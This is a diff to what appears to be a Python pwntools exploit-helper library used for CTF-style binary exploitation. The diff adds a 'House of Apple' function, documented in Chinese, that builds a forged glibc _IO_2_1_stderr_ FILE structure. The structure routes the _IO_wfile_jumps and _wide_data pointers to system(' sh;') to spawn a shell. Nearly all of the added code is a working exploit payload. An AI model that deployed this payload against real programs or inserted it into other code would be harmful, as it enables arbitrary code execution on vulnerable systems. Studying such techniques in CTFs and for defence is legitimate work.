@@ -589,6 +589,22 @@ def HOA3underflow_orw(libc_str, libc_base, payload_addr, filename = 'flag\x00', 
         payload = HOA3underflow2_rop(_IO_wfile_jumps, payload_addr, setcontext, payload_rop, pop_rbx_rbp, ret)
         return payload
 
+def HOA(libc):
+    '''
+        House of apple的攻击链
+        
+        libc: libc必须是设置过libc_base的
+        payload 需要覆盖 _IO_2_1_stderr_
+    '''
+    payload = flat({
+        0x0: b"  sh;",
+        0x28: p64(libc.symbols['system']),
+        0x88: p64(libc.symbols['_environ']-0x10),
+        0xa0: p64(libc.symbols['_IO_2_1_stderr_']-0x40),    # _wide_data
+        0xD8: p64(libc.symbols['_IO_wfile_jumps']),         # jumptable
+    }, filler=b"\x00")
+    return payload
+
 if __name__ == '__main__':
     p = process('./demo')
     
